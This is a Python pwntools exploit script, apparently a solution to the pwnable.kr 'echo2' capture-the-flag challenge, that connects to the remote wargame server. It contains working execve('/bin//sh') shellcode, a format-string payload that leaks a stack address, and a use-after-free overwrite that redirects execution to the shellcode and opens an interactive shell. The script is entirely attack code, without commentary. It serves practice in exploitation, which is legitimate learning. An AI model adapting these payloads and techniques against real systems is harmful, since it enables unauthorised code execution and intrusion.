from pwn import *

SHELLCODE = "\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"

# conn = process("./echo2")
conn = remote("pwnable.kr", 9011)

conn.recvuntil("name? : ")
conn.sendline(SHELLCODE)

conn.recvuntil("> ")
conn.sendline("2")

conn.sendline("leak: %10$llx")
conn.recvuntil("leak: ")
leak = int(conn.recvline(), 16)
print "name address: ", hex(leak - 0x20)

conn.recvuntil("> ")
conn.sendline("4")
conn.recvuntil("(y/n)")
conn.sendline("n")
conn.sendline("3")

conn.recvuntil("> ")
conn.sendline("A"*24 + p64(leak - 0x20))
conn.recvuntil("> ")

conn.interactive()